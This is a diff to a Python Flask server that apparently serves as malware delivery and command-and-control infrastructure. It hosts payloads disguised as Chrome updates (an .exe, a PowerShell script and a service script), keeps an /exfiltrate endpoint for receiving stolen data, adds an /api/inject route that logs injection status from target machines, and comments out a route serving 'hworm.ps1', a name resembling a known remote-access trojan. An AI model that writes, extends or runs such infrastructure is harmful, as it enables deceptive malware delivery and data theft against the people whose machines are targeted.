@@ -13,8 +13,9 @@ import os
 import base64
 
 app = Flask(__name__)
-UPDATE_FILE_PATH = "chrome_update.exe"
-UPDATE_FILE_PS = "chrome_update.ps1"
+UPDATE_FILE_PATH = r".\payloads\chrome_update.exe"
+UPDATE_FILE_PS = r".\payloads\chrome_update.ps1"
+UPDATE_FILE_SER = r".\payloads\chrome_service.py"
 
 PORT = 8080
 
@@ -45,18 +46,27 @@ def ps_update():
         return send_file(UPDATE_FILE_PS, as_attachment=True)
     else:
         return "Update file not found.", 404
+
+@app.route('/chrome_service', methods=['GET'])
+def serve_service():
+    if os.path.exists(UPDATE_FILE_SER):
+        return send_file(UPDATE_FILE_SER, as_attachment=True)
+    else:
+        return "Service file not found.", 404
+    
+    print("Injecting DewDrop into target machine...")
     
 @app.route('/health', methods=['GET'])
 def health_check():
     return "Healthy", 200
 
-@app.route("/hworm.ps1", methods=['GET'])
-def hworm_download():
-    package_path = "hworm.ps1"
-    if os.path.exists(package_path):
-        return send_file(package_path, as_attachment=True)
-    else:
-        return "Package not found.", 404
+# @app.route("/hworm.ps1", methods=['GET'])
+# def hworm_download():
+#     package_path = "hworm.ps1"
+#     if os.path.exists(package_path):
+#         return send_file(package_path, as_attachment=True)
+#     else:
+#         return "Package not found.", 404
     
 @app.route('/exfiltrate', methods=['POST'])
 def exfiltrate_data():
@@ -68,6 +78,15 @@ def exfiltrate_data():
     
     return "Data received", 200
 
+@app.route('/api/inject', methods=['GET'])
+def api_inject():
+    status = request.args.get('status', 'unknown')
+    print(f"Injection Status: {status}")
+    with open("injection_status.txt", "a") as f:
+        f.write(f"{status}\n")
+    
+    return "Status logged", 200
+
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=PORT)
+    app.run(host='127.0.0.1', port=PORT)
     
